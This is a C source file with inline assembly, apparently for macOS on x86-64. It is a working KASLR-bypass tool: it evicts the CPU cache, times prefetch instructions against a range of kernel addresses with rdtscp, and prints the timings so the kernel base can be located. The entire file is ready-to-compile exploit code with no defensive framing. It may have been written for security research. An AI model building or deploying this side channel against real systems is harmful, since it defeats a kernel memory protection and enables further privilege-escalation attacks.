// gcc -o kaslr kaslr.c -Wall -O3
#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <stdint.h>             // uint64_t
#include <stdio.h>              // fprintf, stderr
#include <stdlib.h>             // malloc, free, qsort
#include <string.h>             // strerror

#include <sys/sysctl.h>         // sysctl

#define LOG(str, args...) do { fprintf(stderr, str "\n", ##args); } while(0)

#define PROBE_NUM   16
#define PROBE_START 0xffffff8000000000
#define PROBE_END   0xffffff8020000000
#define PROBE_STEP  0x100000

uint64_t time_addr(uint64_t addr, uint8_t *mem, uint32_t cachesize, uint32_t cacheline);

__asm__
(
    "_time_addr:\n"
    // Evict cache
    "evict:\n"
    "   subl %ecx, %edx\n"
    "   movq $0, (%rsi, %rdx, 1)\n"
    "   cmp $0, %edx\n"
    "   jg evict\n"
    // Prefetch+Time
    "   mfence\n"
    "   rdtscp\n"
    "   movl %eax, %r10d\n"
    "   movl %edx, %r11d\n"
    "   prefetcht2 (%rdi)\n"
    "   rdtscp\n"
    // Calculate return value
    "   subl %r11d, %edx\n"
    "   subl %r10d, %eax\n"
    "   salq $32, %rdx\n"
    "   orq %rdx, %rax\n"
    "   ret\n"
);

int main(void)
{
    int ctrl[] = { CTL_HW, HW_L3CACHESIZE };
    uint32_t cachesize = 0;
    size_t size = sizeof(cachesize);
    if(sysctl(ctrl, sizeof(ctrl) / sizeof(*ctrl), &cachesize, &size, NULL, 0) != 0)
    {
        LOG("sysctl(\"hw.l3cachesize\") failed: %s", strerror(errno));
        return -1;
    }

    ctrl[1] = HW_CACHELINE;
    uint32_t cacheline = 0;
    size = sizeof(cacheline);
    if(sysctl(ctrl, sizeof(ctrl) / sizeof(*ctrl), &cacheline, &size, NULL, 0) != 0)
    {
        LOG("sysctl(\"hw.cachelinesize\") failed: %s", strerror(errno));
        return -1;
    }

    void *mem = malloc(cachesize);
    if(mem == NULL)
    {
        LOG("Failed to allocate cache eviction buffer: %s", strerror(errno));
        return -1;
    }

    int ret = -1;

    uint64_t num = (PROBE_END - PROBE_START) / PROBE_STEP;
    uint64_t *res = malloc(num * PROBE_NUM * sizeof(*res));
    if(!res)
    {
        LOG("Failed to allocate timings buffer: %s", strerror(errno));
        goto cleanup;
    }

    // Probe kernel mem
    for(uint64_t addr = PROBE_START, i = 0; i < num; ++i, addr += PROBE_STEP)
    {
        for(size_t j = 0; j < PROBE_NUM; ++j)
        {
            sched_yield();
            res[i * PROBE_NUM + j] = time_addr(addr, mem, cachesize, cacheline);
        }
    }
    for(uint64_t addr = PROBE_START, i = 0; i < num; ++i, addr += PROBE_STEP)
    {
        printf("0x%016llx", addr);
        for(size_t j = 0; j < PROBE_NUM; ++j)
        {
            printf(" %6llu", res[i * PROBE_NUM + j]);
        }
        printf("\n");
    }

    ret = 0;

    free(res);
cleanup:;
    free(mem);
    return ret;
}
